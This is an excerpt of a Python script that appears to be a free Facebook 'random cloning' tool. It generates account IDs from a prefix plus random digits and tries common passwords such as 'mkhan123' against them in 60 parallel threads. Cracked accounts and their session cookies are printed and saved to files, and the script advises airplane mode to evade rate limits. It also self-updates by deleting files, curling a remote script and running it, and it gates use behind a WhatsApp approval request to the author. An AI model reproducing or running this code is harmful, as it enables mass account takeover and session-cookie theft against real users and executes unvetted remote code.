...
logo = """
    _   _  _____ ___  ___ _____  _____ 
 | \ | ||  _  ||  \/  ||_   _||_   _|
 |  \| || | | || .  . |  | |    | |  
 | . ` || | | || |\/| |  | |    | |  
 | |\  |\ \_/ /| |  | | _| |_  _| |_ 
 \_| \_/ \___/ \_|  |_/ \___/  \___/ 
                                      \033[1;32mLPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mNOMI\033[1;37m
[•] STATUS     : \033[1;32mFREE\033[1;37m
[•]TooL Typ     :\033[1;32mRANDOM-CLONING\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/NOMii-JUTT/NOMii-JUTT/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/NOMii-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/NOMii-JUTT/NOMii/main/NOMii.py > NOMii.py')
        os.system('python NOMii.py')
    else:pass
...
def menu():
	...
	if opt =='1':
		...
		print('\n\033[1;37m[•] Choose vAliid option\033[0;97m')
		time.sleep(2)
		menu()
...
def mkhan_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mKhan + BALOCH')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'mkhan123','mkhan1122','baloch786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NOMI-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[NOMI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mNOMI\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Juttking/Jutt77/blob/main/Jutt.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923459049969?text='+tks),approval()
      time.sleep(3.1)
      approval()
  except:
    sys.exit()
